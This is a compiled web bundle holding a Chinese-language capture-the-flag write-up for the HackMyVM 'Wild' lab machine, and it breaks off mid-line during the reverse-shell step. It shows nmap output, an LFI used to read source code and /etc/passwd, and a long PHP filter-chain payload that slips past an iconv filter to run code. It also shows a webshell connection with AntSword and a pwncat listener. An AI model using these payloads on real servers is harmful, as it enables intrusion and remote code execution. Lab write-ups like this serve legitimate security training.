"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[3232],{93334:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>r,metadata:()=>a,toc:()=>l});var o=t(85893),s=t(11151);const r={},i="Wild",a={id:"HackMyVM/Machines/Wild/index",title:"Wild",description:"[Linux VM] [Tested on VirtualBox] created by || cromiphi",source:"@site/docs/HackMyVM/Machines/Wild/index.md",sourceDirName:"HackMyVM/Machines/Wild",slug:"/HackMyVM/Machines/Wild/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Wild/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Wild/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Whitedoor",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Whitedoor/"},next:{title:"XMAS",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/XMAS/"}},c={},l=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1 Port-80",id:"web-\u670d\u52a1-port-80",level:2},{value:"\u672c\u5730\u6587\u4ef6\u8bfb\u53d6",id:"\u672c\u5730\u6587\u4ef6\u8bfb\u53d6",level:3},{value:"WildFly Port-8080",id:"wildfly-port-8080",level:2},{value:"WildFly Port-8443",id:"wildfly-port-8443",level:2},{value:"WildFly Management Console Port-9990",id:"wildfly-management-console-port-9990",level:2},{value:"LFI \u7ed5\u8fc7\u8fc7\u6ee4\u5668\u5b9e\u73b0 webshell",id:"lfi-\u7ed5\u8fc7\u8fc7\u6ee4\u5668\u5b9e\u73b0-webshell",level:2},{value:"\u5229\u7528 WildFly \u5f97\u5230\u7684\u7528\u6237\u54c8\u5e0c\u90e8\u7f72 Webshell",id:"\u5229\u7528-wildfly-\u5f97\u5230\u7684\u7528\u6237\u54c8\u5e0c\u90e8\u7f72-webshell",level:2},{value:"\u5229\u7528\u7528\u6237\u540d\u4e0e\u54c8\u5e0c\u8fdb\u5165 console \u90e8\u7f72 war \u5305",id:"\u5229\u7528\u7528\u6237\u540d\u4e0e\u54c8\u5e0c\u8fdb\u5165-console-\u90e8\u7f72-war-\u5305",level:3},{value:"\u53cd\u5f39 shell",id:"\u53cd\u5f39-shell",level:3},{value:"User - tod",id:"user---tod",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",p:"p",pre:"pre",...(0,s.a)(),...e.components},{Details:r}=n;return r||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.header,{children:(0,o.jsx)(n.h1,{id:"wild",children:"Wild"})}),"\n",(0,o.jsxs)(n.admonition,{type:"note",children:[(0,o.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || cromiphi"}),(0,o.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2024-02-14"}),(0,o.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 8ada0b4670e56b3e73e954f12b5f6ce4"}),(0,o.jsx)(n.p,{children:"\u2620 Root // 0"}),(0,o.jsx)(n.p,{children:"\ud83d\udc80 User // 0"}),(0,o.jsx)(n.p,{children:"\ud83d\udcddNotes //\nEnjoy it."})]}),"\n",(0,o.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,o.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.106\n"})}),"\n",(0,o.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:'Nmap scan report for 192.168.56.106 (192.168.56.106)\nHost is up (0.00047s latency).\nNot shown: 65530 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n22/tcp   open  ssh           OpenSSH 9.2p1 Debian 2 (protocol 2.0)\n| ssh-hostkey:\n|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)\n|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)\n80/tcp   open  http          Apache httpd 2.4.57 ((Debian))\n|_http-title: burger html5 landing page\n|_http-server-header: Apache/2.4.57 (Debian)\n8080/tcp open  http-proxy\n|_http-title: Welcome to WildFly\n|_http-open-proxy: Proxy might be redirecting requests\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.1 404 Not Found\n|     Connection: close\n|     Content-Length: 74\n|     Content-Type: text/html\n|     Date: Wed, 14 Feb 2024 08:32:08 GMT\n|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Connection: close\n|     Last-Modified: Wed, 18 Oct 2023 06:43:38 GMT\n|     Content-Length: 1590\n|     Content-Type: text/html\n|     Accept-Ranges: bytes\n|     Date: Wed, 14 Feb 2024 08:32:06 GMT\n|     \x3c!--\n|     Copyright The WildFly Authors\n|     SPDX-License-Identifier: Apache-2.0\n|     <!DOCTYPE html>\n|     <html>\n|     <head>\n|     \x3c!-- proper charset --\x3e\n|     <meta http-equiv="content-type" content="text/html;charset=utf-8" />\n|     <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />\n|     <title>Welcome to WildFly</title>\n|     <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">\n|     <link rel="StyleSheet" href="wildfly.css" type="text/css">\n|     </head>\n|     <body>\n|     <div class="wrapper">\n|     <div class="content">\n|     <div class="logo">\n|     <img src="wildfly_logo.png" alt="WildFly" border="0" />\n|     </div>\n|     <h1>Welcome to WildFly</h1>\n|     <h3>Your WildFly instance is ru\n|   HTTPOptions:\n|     HTTP/1.1 405 Method Not Allowed\n|     Allow: GET, HEAD, POST\n|     Connection: close\n|     Content-Length: 83\n|     Content-Type: text/html\n|     Date: Wed, 14 Feb 2024 08:32:07 GMT\n|     <html><head><title>Error</title></head><body>405 - Method Not Allowed</body></html>\n|   RTSPRequest:\n|     HTTP/1.1 400 Bad Request\n|     Content-Length: 0\n|_    Connection: close\n8443/tcp open  ssl/https-alt\n| tls-alpn:\n|_  http/1.1\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2024-02-14T08:32:07\n|_Not valid after:  2034-02-11T08:32:07\n|_http-title: Welcome to WildFly\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.1 404 Not Found\n|     Connection: close\n|     Content-Length: 74\n|     Content-Type: text/html\n|     Date: Wed, 14 Feb 2024 08:32:14 GMT\n|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Connection: close\n|     Last-Modified: Wed, 18 Oct 2023 06:43:38 GMT\n|     Content-Length: 1590\n|     Content-Type: text/html\n|     Accept-Ranges: bytes\n|     Date: Wed, 14 Feb 2024 08:32:14 GMT\n|     \x3c!--\n|     Copyright The WildFly Authors\n|     SPDX-License-Identifier: Apache-2.0\n|     <!DOCTYPE html>\n|     <html>\n|     <head>\n|     \x3c!-- proper charset --\x3e\n|     <meta http-equiv="content-type" content="text/html;charset=utf-8" />\n|     <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />\n|     <title>Welcome to WildFly</title>\n|     <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">\n|     <link rel="StyleSheet" href="wildfly.css" type="text/css">\n|     </head>\n|     <body>\n|     <div class="wrapper">\n|     <div class="content">\n|     <div class="logo">\n|     <img src="wildfly_logo.png" alt="WildFly" border="0" />\n|     </div>\n|     <h1>Welcome to WildFly</h1>\n|     <h3>Your WildFly instance is ru\n|   HTTPOptions:\n|     HTTP/1.1 405 Method Not Allowed\n|     Allow: GET, HEAD, POST\n|     Connection: close\n|     Content-Length: 83\n|     Content-Type: text/html\n|     Date: Wed, 14 Feb 2024 08:32:14 GMT\n|_    <html><head><title>Error</title></head><body>405 - Method Not Allowed</body></html>\n|_ssl-date: TLS randomness does not represent time\n9990/tcp open  osm-appsrvr?\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.1 404 Not Found\n|     Connection: close\n|     Content-Length: 74\n|     Content-Type: text/html\n|     Date: Wed, 14 Feb 2024 08:32:27 GMT\n|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>\n|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest:\n|     HTTP/1.1 400 Bad Request\n|     Content-Length: 0\n|     Connection: close\n|   GetRequest:\n|     HTTP/1.1 302 Found\n|     Connection: close\n|     Location: /console/index.html\n|     Content-Length: 0\n|     Date: Wed, 14 Feb 2024 08:32:06 GMT\n|   HTTPOptions:\n|     HTTP/1.1 405 Method Not Allowed\n|     Connection: close\n|     Content-Length: 83\n|     Content-Type: text/html\n|     Date: Wed, 14 Feb 2024 08:32:07 GMT\n|_    <html><head><title>Error</title></head><body>405 - Method Not Allowed</body></html>\n'})}),"\n",(0,o.jsx)(n.h2,{id:"web-\u670d\u52a1-port-80",children:"web \u670d\u52a1 Port-80"}),"\n",(0,o.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u5f97\u5230\u4ee5\u4e0b\u4fe1\u606f"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"[16:36:20] 200 -    3B  - /about.php\n[16:36:32] 301 -  314B  - /css  ->  http://192.168.56.106/css/\n[16:36:35] 301 -  316B  - /fonts  ->  http://192.168.56.106/fonts/\n[16:36:37] 301 -  317B  - /images  ->  http://192.168.56.106/images/\n[16:36:37] 200 -    4KB - /images/\n[16:36:37] 200 -   19KB - /index.php\n[16:36:37] 200 -   19KB - /index.php/login/\n[16:36:38] 200 -    1KB - /js/\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u672a\u53d1\u73b0\u6709\u4ef7\u503c\u7684\u4fe1\u606f"}),"\n",(0,o.jsx)(n.p,{children:"\u5bf9\u9996\u9875\u7684\u529f\u80fd\u70b9\u8fdb\u884c\u63a2\u6d4b\uff0c\u53d1\u73b0\u4ee5\u4e0b\u94fe\u63a5"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.106/recipe.php\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u7ecf\u8fc7\u7b80\u5355\u7684\u529f\u80fd\u63a2\u6d4b\uff0c\u53d1\u73b0\u53ef\u80fd\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\uff08LFI\uff09"}),"\n",(0,o.jsx)(n.h3,{id:"\u672c\u5730\u6587\u4ef6\u8bfb\u53d6",children:"\u672c\u5730\u6587\u4ef6\u8bfb\u53d6"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-php",metastring:'title="fatty-burger.php"',children:'# http://192.168.56.106/recipe.php?file=php://filter/read=convert.base64-encode/resource=fatty-burger.php\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Fatty Burger Recipe</title>\n    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" />\n    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" />\n    <link rel="stylesheet" href="css/flaticon.css" />\n    <link rel="stylesheet" href="css/animate.css">\n    <link rel="stylesheet" href="css/bootsnav.css">\n    <link rel="stylesheet" href="css/color.css">\n    <link rel="stylesheet" href="css/custom.css" />\n</head>\n<body data-spy="scroll" data-target="#navbar-menu" data-offset="100">\n    <section id="block">\n        <div class="container">\n            <div class="row">\n                <div class="col-md-8 col-md-offset-2">\n                    <div class="feature">\n                        <h1>Fatty Burger Recipe</h1>\n   <div class="recipe-content">\n   <br>\n   <br>\n   <p style="color: white; font-weight: bold; font-size: 22px;">A double layer of sear-sizzled 100% pure beef mingled with special sauce on a sesame seed bun and topped with melty American cheese, crisp lettuce, minced onions, and tangy pickles.</p>\n                        <p> A double layer of sear-sizzled 100% pure beef mingled with special sauce on a sesame seed bun and topped with melty American cheese, crisp lettuce, minced onions, and tangy pickles.</p>\n                        <p><strong>Based on pre-cooked patty weight.</strong></p>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </section>\n\n    <script src="http://code.jquery.com/jquery-1.12.1.min.js"><\/script>\n    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"><\/script>\n    <script src="js/bootsnav.js"><\/script>\n</body>\n</html>\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u5c1d\u8bd5\u8bfb\u53d6\u70b9\u5355\u9875\u9762"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-php",metastring:'title="recipe.php"',children:'# http://192.168.56.106/recipe.php?file=php://filter/read=convert.base64-encode/resource=recipe.php\n<!DOCTYPE html>\n<html lang="fr">\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Food</title>\n    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" />\n    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" />\n    <link rel="stylesheet" href="css/flaticon.css" />\n    <link rel="stylesheet" href="css/animate.css">\n    <link rel="stylesheet" href="css/bootsnav.css">\n    <link rel="stylesheet" href="css/color.css">\n    <link rel="stylesheet" href="css/custom.css" />\n</head>\n<body data-spy="scroll" data-target="#navbar-menu" data-offset="100">\n    <nav class="navbar navbar-default bootsnav no-background navbar-fixed black">\n        <div class="container">\n            <div class="navbar-header">\n                <a class="navbar-brand" href="#"><img src="images/logo.png" class="logo" alt=""></a>\n            </div>\n        </div>\n    </nav>\n    <section id="block">\n        <div class="container">\n            <div class="row">\n                <div class="col-md-8 col-md-offset-2">\n                    <div class="feature">\n                        <h1>Welcome !</h1>\n   <p style="color: red; font-weight: bold;font-size: 24px;">Choose a recipe :</p>\n                        <ul class="list-group">\n                            <li class="list-group-item"><a href="?file=fatty-burger.php">Fatty Burger</a></li>\n                            <li class="list-group-item"><a href="?file=shack-burger.php">Shack Burger</a></li>\n                            <li class="list-group-item"><a href="?file=cheddar-burger.php">Cheddar Junky Stuffed Burgers</a></li>\n                        </ul>\n                    </div>\n                </div>\n            </div>\n        </div>\n    </section>\n\n    <script src="http://code.jquery.com/jquery-1.12.1.min.js"><\/script>\n    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"><\/script>\n    <script src="js/bootsnav.js"><\/script>\n</body>\n</html>\n\n\n<?php\nini_set(\'allow_url_include\', \'0\');\n\nfunction isForbidden($input) {\n    return stripos($input, "iconv") !== false;\n}\n\nif(isset($_GET[\'file\'])) {\n    $file = $_GET[\'file\'];\n\n    if (isForbidden($file)) {\n        echo "<div class=\'container\'><div class=\'alert alert-danger\'>Access denied !</div></div>";\n    } elseif (strncmp($file, "/", 1) !== 0 && strncmp($file, "..", 2) !== 0) {\n        @include($file);\n    } else {\n        echo "<div class=\'container\'><div class=\'alert alert-danger\'>Access denied !</div></div>";\n    }\n}\n?>\n'})}),"\n",(0,o.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u51fa\uff0c\u7f51\u7ad9\u5173\u95ed\u4e86\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0c\u540c\u65f6\u8fd9\u91cc\u5bf9 ",(0,o.jsx)(n.code,{children:"iconv"})," \u548c ",(0,o.jsx)(n.code,{children:"/"})," \u4ee5\u53ca ",(0,o.jsx)(n.code,{children:".."})," \u8fdb\u884c\u4e86\u8fc7\u6ee4\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e2d\u5e76\u6ca1\u6709\u5b9e\u8d28\u6027\u9650\u5236"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",metastring:'title="/etc/passwd"',children:"# http://192.168.56.106/recipe.php?file=php://filter/read=convert.base64-encode/resource=../../../../../../../etc/passwd\nroot:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\nsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:100:107::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nsshd:x:102:65534::/run/sshd:/usr/sbin/nologin\ndnsmasq:x:103:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\npolkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin\ntod:x:1002:1002:,,,:/home/tod:/bin/zsh\n"})}),"\n",(0,o.jsxs)(n.p,{children:["\u4ece ",(0,o.jsx)(n.code,{children:"/etc/passwd"})," \u7684\u6570\u636e\u4e2d\uff0c\u53ef\u4ee5\u5f97\u77e5\u9776\u673a\u4e0a\u7684\u4e24\u4e2a\u53ef\u8bbf\u95ee\u7528\u6237"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"root\ntod\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u5e76\u4e14\u901a\u8fc7\u63a2\u6d4b\uff0c\u53ef\u4ee5\u5b9a\u4f4d\u5230\u7f51\u7ad9\u6570\u636e\u7684\u7edd\u5bf9\u5730\u5740"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"/var/www/html\n"})}),"\n",(0,o.jsx)(n.h2,{id:"wildfly-port-8080",children:"WildFly Port-8080"}),"\n",(0,o.jsx)(n.p,{children:"\u5c1d\u8bd5\u8bbf\u95ee\uff0c\u670d\u52a1\u5668\u8fd4\u56de"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:'Your WildFly instance is running\n\nTo replace this page simply deploy your own war with / as its context path.\nTo disable it, remove the "welcome-content" handler for location / in the undertow subsystem.\n'})}),"\n",(0,o.jsx)(n.h2,{id:"wildfly-port-8443",children:"WildFly Port-8443"}),"\n",(0,o.jsx)(n.p,{children:"\u6b64\u7aef\u53e3\u540c\u6837\u4e3a WildFly \u670d\u52a1\uff0c\u53ea\u662f\u534f\u8bae\u4e3a HTTPS"}),"\n",(0,o.jsx)(n.h2,{id:"wildfly-management-console-port-9990",children:"WildFly Management Console Port-9990"}),"\n",(0,o.jsx)(n.p,{children:"\u6b64\u7aef\u53e3\u4e3a WildFly \u670d\u52a1\u7684\u7ba1\u7406\u540e\u53f0"}),"\n",(0,o.jsx)(n.h2,{id:"lfi-\u7ed5\u8fc7\u8fc7\u6ee4\u5668\u5b9e\u73b0-webshell",children:"LFI \u7ed5\u8fc7\u8fc7\u6ee4\u5668\u5b9e\u73b0 webshell"}),"\n",(0,o.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,o.jsx)(n.a,{href:"https://github.com/synacktiv/php_filter_chain_generator/",children:"synacktiv/php_filter_chain_generator - Github"})," \u751f\u6210\u653b\u51fb\u8f7d\u8377"]}),"\n",(0,o.jsxs)(n.p,{children:["\u7136\u540e\u7528 ",(0,o.jsx)(n.code,{children:"%25xx"})," \u7ed5\u8fc7\u5bf9 iconv \u7684\u68c0\u6d4b"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.106/recipe.php?file=php://filter/convert.i%2563onv.UTF8.CSISO2022KR|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.UTF8.UTF16|convert.i%2563onv.WINDOWS-1258.UTF32LE|convert.i%2563onv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.ISO2022KR.UTF16|convert.i%2563onv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.865.UTF16|convert.i%2563onv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CSA_T500.UTF-32|convert.i%2563onv.CP857.ISO-2022-JP-3|convert.i%2563onv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.IBM891.CSUNICODE|convert.i%2563onv.ISO8859-14.ISO6937|convert.i%2563onv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.UTF8.UTF16LE|convert.i%2563onv.UTF8.CSISO2022KR|convert.i%2563onv.UCS2.UTF8|convert.i%2563onv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP861.UTF-16|convert.i%2563onv.L4.GB13000|convert.i%2563onv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP869.UTF-32|convert.i%2563onv.MACUK.UCS4|convert.i%2563onv.UTF16BE.866|convert.i%2563onv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.JS.UNICODE|convert.i%2563onv.L4.UCS2|convert.i%2563onv.UCS-2.OSF00030010|convert.i%2563onv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.PT.UTF32|convert.i%2563onv.KOI8-U.IBM-932|convert.i%2563onv.SJIS.EUCJP-WIN|convert.i%2563onv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.ISO88597.UTF16|convert.i%2563onv.RK1048.UCS-4LE|convert.i%2563onv.UTF32.CP1167|convert.i%2563onv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.INIS.UTF16|convert.i%2563onv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.L5.UTF-32|convert.i%2563onv.ISO88594.GB13000|convert.i%2563onv.CP950.SHIFT_JISX0213|convert.i%2563onv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP861.UTF-16|convert.i%2563onv.L4.GB13000|convert.i%2563onv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP861.UTF-16|convert.i%2563onv.L4.GB13000|convert.i%2563onv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.INIS.UTF16|convert.i%2563onv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.L5.UTF-32|convert.i%2563onv.ISO88594.GB13000|convert.i%2563onv.CP950.SHIFT_JISX0213|convert.i%2563onv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.863.UNICODE|convert.i%2563onv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.ISO88597.UTF16|convert.i%2563onv.RK1048.UCS-4LE|convert.i%2563onv.UTF32.CP1167|convert.i%2563onv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.PT.UTF32|convert.i%2563onv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.JS.UNICODE|convert.i%2563onv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.SE2.UTF-16|convert.i%2563onv.CSIBM921.NAPLPS|convert.i%2563onv.855.CP936|convert.i%2563onv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.JS.UNICODE|convert.i%2563onv.L4.UCS2|convert.i%2563onv.UCS-2.OSF00030010|convert.i%2563onv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CSGB2312.UTF-32|convert.i%2563onv.IBM-1161.IBM932|convert.i%2563onv.GB13000.UTF16BE|convert.i%2563onv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.SE2.UTF-16|convert.i%2563onv.CSIBM1161.IBM-932|convert.i%2563onv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.PT.UTF32|convert.i%2563onv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.SE2.UTF-16|convert.i%2563onv.CSIBM1161.IBM-932|convert.i%2563onv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.SE2.UTF-16|convert.i%2563onv.CSIBM921.NAPLPS|convert.i%2563onv.855.CP936|convert.i%2563onv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.8859_3.UTF16|convert.i%2563onv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP1046.UTF16|convert.i%2563onv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CP1046.UTF32|convert.i%2563onv.L6.UCS-2|convert.i%2563onv.UTF-16LE.T.61-8BIT|convert.i%2563onv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.MAC.UTF16|convert.i%2563onv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.CSIBM1161.UNICODE|convert.i%2563onv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.INIS.UTF16|convert.i%2563onv.CSIBM1133.IBM943|convert.i%2563onv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.i%2563onv.SE2.UTF-16|convert.i%2563onv.CSIBM1161.IBM-932|convert.i%2563onv.MS932.MS936|convert.i%2563onv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.i%2563onv.UTF8.UTF7|convert.base64-decode/resource=php://temp&1=phpinfo();\n"})}),"\n",(0,o.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4f7f\u7528 ",(0,o.jsx)(n.code,{children:"AntSword"})," \u5efa\u7acb\u8fde\u63a5\uff0c\u6210\u529f\u8fde\u63a5 webshell\uff0c\u5c06\u4f1a\u8bdd\u53cd\u5f39\u81f3\u76d1\u542c\u5668"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 8888\n[18:20:02] Welcome to pwncat \ud83d\udc08!\n[18:20:53] received connection from 